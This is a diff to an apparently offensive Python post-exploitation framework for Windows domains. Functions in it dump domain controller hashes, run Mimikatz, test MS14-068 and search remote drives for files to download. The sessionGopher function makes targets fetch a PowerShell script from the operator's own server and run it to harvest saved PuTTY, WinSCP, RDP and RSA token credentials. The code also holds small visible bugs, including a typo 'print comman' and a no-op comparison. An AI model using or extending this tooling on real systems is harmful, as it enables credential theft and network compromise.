@@ -1062,11 +1062,19 @@ def dumpDCHashes(tmphostno,tmpdomain,tmpusername,tmppassword,tmppasswordHash):
                 if len(tmpdomain)<1:
                     tmpdomain="WORKGROUP"
                 if tmppassword==None:
-                    if [tmphostno, tmpdomain, tmpusername, tmppasswordHash] not in accessAdmHostList:
-                        accessAdmHostList.append([tmphostno, tmpdomain, tmpusername, tmppasswordHash])                            
+                    tmpHostList=[]
+                    for z in accessAdmHostList:
+                        tmpHostList.append(z[0])
+                    if tmphostno not in tmpHostList:
+                        if [tmphostno, tmpdomain, tmpusername, tmppasswordHash] not in accessAdmHostList:
+                            accessAdmHostList.append([tmphostno, tmpdomain, tmpusername, tmppasswordHash])                            
                 else:
-                    if [tmphostno, tmpdomain, tmpusername, tmppassword] not in accessAdmHostList:
-                        accessAdmHostList.append([tmphostno, tmpdomain, tmpusername, tmppassword])
+                    tmpHostList=[]
+                    for z in accessAdmHostList:
+                        tmpHostList.append(z[0])
+                    if tmphostno not in tmpHostList:
+                        if [tmphostno, tmpdomain, tmpusername, tmppassword] not in accessAdmHostList:
+                            accessAdmHostList.append([tmphostno, tmpdomain, tmpusername, tmppassword])
                 print (setColor("\n[+]", bold, color="green"))+" List of Valid Hashes"
                 for x in tmpLines1:
                     print x
@@ -1083,11 +1091,19 @@ def dumpDCHashes(tmphostno,tmpdomain,tmpusername,tmppassword,tmppasswordHash):
                 if len(tmpdomain)<1:
                     tmpdomain="WORKGROUP"
                 if tmppassword==None:
-                    if [tmphostno, tmpdomain, tmpusername, tmppasswordHash] not in accessAdmHostList:
-                        accessAdmHostList.append([tmphostno, tmpdomain, tmpusername, tmppasswordHash])                            
+                    tmpHostList=[]
+                    for z in accessAdmHostList:
+                        tmpHostList.append(z[0])
+                    if tmphostno not in tmpHostList:
+                        if [tmphostno, tmpdomain, tmpusername, tmppasswordHash] not in accessAdmHostList:
+                            accessAdmHostList.append([tmphostno, tmpdomain, tmpusername, tmppasswordHash])                            
                 else:
-                    if [tmphostno, tmpdomain, tmpusername, tmppassword] not in accessAdmHostList:
-                        accessAdmHostList.append([tmphostno, tmpdomain, tmpusername, tmppassword])                            
+                    tmpHostList=[]
+                    for z in accessAdmHostList:
+                        tmpHostList.append(z[0])
+                    if tmphostno not in tmpHostList:
+                        if [tmphostno, tmpdomain, tmpusername, tmppassword] not in accessAdmHostList:
+                            accessAdmHostList.append([tmphostno, tmpdomain, tmpusername, tmppassword])                            
                 print (setColor("\n[+]", bold, color="green"))+" List of Valid Hashes"
                 for x in tmpLines1:
                     print x
@@ -1126,14 +1142,22 @@ def runMimikatz(targetIP,domain,username,password,passwordHash):
             if len(domain)<1:
                 domain="WORKGROUP"
             if password!=None:
-                if [targetIP, domain, username, password] not in accessAdmHostList:
-                    accessAdmHostList.append([ip, str(domain), str(username), str(password)])
+                tmpHostList=[]
+                for z in accessAdmHostList:
+                    tmpHostList.append(z[0])
+                if targetIP not in tmpHostList:
+                    if [targetIP, domain, username, password] not in accessAdmHostList:
+                        accessAdmHostList.append([targetIP, str(domain), str(username), str(password)])
         else:
             if len(domain)<1:
                 domain="WORKGROUP"
             if password!=None:
-                if [targetIP, domain, username, password] not in accessAdmHostList:
-                    accessAdmHostList.append([ip, str(domain), str(username), str(password)])
+                tmpHostList=[]
+                for z in accessAdmHostList:
+                    tmpHostList.append(z[0])
+                if targetIP not in tmpHostList:
+                    if [targetIP, domain, username, password] not in accessAdmHostList:
+                        accessAdmHostList.append([targetIP, str(domain), str(username), str(password)])
     tmpPasswordList1=[]
     for x in tmpPasswordList:
         tmpDomain=x[0]
@@ -1436,13 +1460,17 @@ def sessionGopher(targetIP,domain,username,password,passwordHash):
     command=powershellCmdStart+' -Command "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/SessionGopher.ps1\',\'%temp%\SessionGopher.ps1\'); . %temp%\SessionGopher.ps1; Invoke-SessionGopher"'
     results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
     if debugMode==True:
-        print command
+        print comman
+    startSearch=False
     tmpResultList=results.split("\n")
     for x in tmpResultList:
-        if len(x.strip())>0:
-            if "FileZilla Sessions" in x or "WinSCP Sessions" in x or "SuperPuTTY Sessions" in x or "PuTTY Sessions" in x or "Microsoft RDP Sessions" in x or "PuTTY Private Key Files (.ppk)" in x or "Microsoft RDP Connection Files (.rdp)" in x or "RSA Tokens (sdtid)" in x or "Microsoft Remote Desktop (RDP) Sessions" in x:
-                print "\n"
-            print x
+        if startSearch==True:
+            if len(x.strip())>0:
+                if "FileZilla Sessions" in x or "WinSCP Sessions" in x or "SuperPuTTY Sessions" in x or "PuTTY Sessions" in x or "Microsoft RDP Sessions" in x or "PuTTY Private Key Files (.ppk)" in x or "Microsoft RDP Connection Files (.rdp)" in x or "RSA Tokens (sdtid)" in x or "Microsoft Remote Desktop (RDP) Sessions" in x:
+                    print "\n"
+                print x
+        if "[+] Digging on PC02 ..." in x:
+            startSearch=True
     return results
 '''
 def getCurrentUsers(targetIP,domain,username,password,passwordHash):
@@ -2029,19 +2057,29 @@ def findInterestingFiles(targetIP,domain,username,password,passwordHash):
         searchKeywords+="'"+x+"',"
     searchKeywords=searchKeywords[0:-1]+")"
     tmpDriveList=[]
-    print "[*] Enumerating Drives on Host: "+targetIP
-    command=powershellCmdStart+' -command "get-psdrive -psprovider filesystem | Select Name"'
+    #print "[*] Enumerating Drives on Host: "+targetIP
+    #command=powershellCmdStart+' -command "get-psdrive -psprovider filesystem | Select Name"'
+    command=powershellCmdStart+' -command "get-psdrive -psprovider filesystem | Select Name, Used | ft -HideTableHeaders"'
     if debugMode==True:
         print command
     results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
     tmpResultList=results.split("\n")
-    count=0
     for x in tmpResultList:
         x=x.strip()
         if len(x)>0:
-            if count>1:
-                tmpDriveList.append(x)
-            count+=1
+            tmpList1=x.split(" ")
+            tmpCount=0
+            tmpDriveLetter=""
+            for y in tmpList1:
+                if len(y)>0:
+                    if tmpCount==0:
+                        tmpDriveLetter=str(y)
+                        tmpCount+=1
+                    else:
+                        tmpCount==1
+                        if int(y)>0:
+                            tmpDriveList.append(tmpDriveLetter)
+                            tmpDriveLetter=""
     tmpFileList=[]
     if len(tmpDriveList)>0:
         print "[*] Drives found on Host: "+targetIP
@@ -2049,7 +2087,7 @@ def findInterestingFiles(targetIP,domain,username,password,passwordHash):
         for x in tmpDriveList:
             tmpDriveList1.append(x+"$")
         print ", ".join(tmpDriveList1)
-    print "[*] Finding Files on Host: "+targetIP
+    #print "[*] Finding Files on Host: "+targetIP
     for drive in tmpDriveList:
         command=powershellCmdStart+' -command '+searchKeywords+'; Get-ChildItem -Path "'+drive+':\" -Recurse -Include "$searchKeywords" -Name'
         if debugMode==True:
@@ -2694,8 +2732,12 @@ def testMS14_068(ip,domain,username,password,passwordHash):
                     if tmpusername.lower()=="administrator":
                         if len(domain)<1:
                             domain="WORKGROUP"
-                        if [ip,domain,tmpusername,tmphash] not in accessAdmHostList:
-                            accessAdmHostList.append([ip,domain,tmpusername,tmphash])
+                        tmpHostList=[]
+                        for z in accessAdmHostList:
+                            tmpHostList.append(z[0])
+                        if ip not in tmpHostList:
+                            if [ip,domain,tmpusername,tmphash] not in accessAdmHostList:
+                                accessAdmHostList.append([ip,domain,tmpusername,tmphash])
 
 
             #accessAdmHostList.append()
@@ -3038,8 +3080,12 @@ else:
                     if ip in uncompromisedHostList:
                         uncompromisedHostList.remove(ip)
                     for ip in dcList:
-                        if [ip, domain, tmpusername, tmppassword] not in accessAdmHostList:
-                            accessAdmHostList.append([ip, domain, tmpusername, tmppassword])
+                        tmpHostList=[]
+                        for z in accessAdmHostList:
+                            tmpHostList.append(z[0])
+                        if ip not in tmpHostList:
+                            if [ip, domain, tmpusername, tmppassword] not in accessAdmHostList:
+                                accessAdmHostList.append([ip, domain, tmpusername, tmppassword])
                 analyzeHashes(tmpHashList)
                 if optionTokenPriv==True and dcCompromised==False:
                     print (setColor("\nEnumerating Tokens and Attempting Privilege Escalation", bold, color="green"))
@@ -3140,8 +3186,12 @@ if len(dcList)>0:
                             if dcList[0] in uncompromisedHostList:
                                 uncompromisedHostList.remove(dcList[0])
                             for dc in dcList:
-                                if [dc, domain, tmpusername, tmppassword] not in accessAdmHostList:
-                                    accessAdmHostList.append([dc, domain, tmpusername, tmppassword])
+                                tmpHostList=[]
+                                for z in accessAdmHostList:
+                                    tmpHostList.append(z[0])
+                                if dc not in tmpHostList:
+                                    if [dc, domain, tmpusername, tmppassword] not in accessAdmHostList:
+                                        accessAdmHostList.append([dc, domain, tmpusername, tmppassword])
                             dcCompromised=True
                         analyzeHashes(tmpHashList)
 
@@ -3333,6 +3383,7 @@ if args.module=="files":
                 passwordHash=None
             tmpFileList=findInterestingFiles(ip,domain,username,password,passwordHash)
             if len(tmpFileList)>0:
+                print (setColor("[+]", bold, color="green"))+" Downloading the files from host: "+ip
                 count=0
                 for filename in tmpFileList:           
                     filename=filename.strip()
